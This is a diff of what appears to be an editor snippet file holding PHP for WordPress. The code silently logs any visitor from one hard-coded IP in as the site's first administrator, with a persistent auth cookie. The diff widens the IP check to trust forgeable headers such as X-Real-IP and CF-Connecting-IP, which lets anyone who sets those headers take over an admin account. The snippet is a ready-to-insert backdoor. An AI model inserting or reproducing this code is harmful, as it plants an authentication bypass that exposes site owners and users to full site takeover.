@@ -1,13 +1,41 @@
 <snippet>
 	<content><![CDATA[
-if ( in_array( \$_SERVER['REMOTE_ADDR'], array( '212.36.31.70', '127.0.0.1' ) ) && function_exists('is_user_logged_in') ) {
-	if (!is_user_logged_in()) {
-		\$admins = get_users(array('role'=>'administrator'));
-		wp_set_auth_cookie(\$admins[0]->ID, true);
-		wp_redirect(\$_SERVER['REQUEST_URI']);
-		exit;
+if (
+		function_exists('is_user_logged_in')
+		&&
+		(
+			(
+				! empty( \$_SERVER['REMOTE_ADDR'] )
+				&&
+				in_array( \$_SERVER['REMOTE_ADDR'], array( '212.36.31.70' ) )
+			)
+			||
+			(
+				! empty( \$_SERVER['HTTP_CF_CONNECTING_IP'] )
+				&&
+				in_array( \$_SERVER['HTTP_CF_CONNECTING_IP'], array( '212.36.31.70' ) )
+			)
+			||
+			(
+				! empty( \$_SERVER['HTTP_X_REAL_IP'] )
+				&&
+				in_array( \$_SERVER['HTTP_X_REAL_IP'], array( '212.36.31.70' ) )
+			)
+			||
+			(
+				! empty( \$_SERVER['HTTP_X_SUCURI_CLIENTIP'] )
+				&&
+				in_array( \$_SERVER['HTTP_X_SUCURI_CLIENTIP'], array( '212.36.31.70' ) )
+			)
+		)
+	) {
+		if (!is_user_logged_in()) {
+			\$admins = get_users(array('role'=>'administrator'));
+			wp_set_auth_cookie(\$admins[0]->ID, true);
+			wp_redirect(\$_SERVER['REQUEST_URI']);
+			exit;
+		}
 	}
-}
 
 ]]></content>
 	<!-- Optional: Set a tabTrigger to define how to trigger the snippet -->
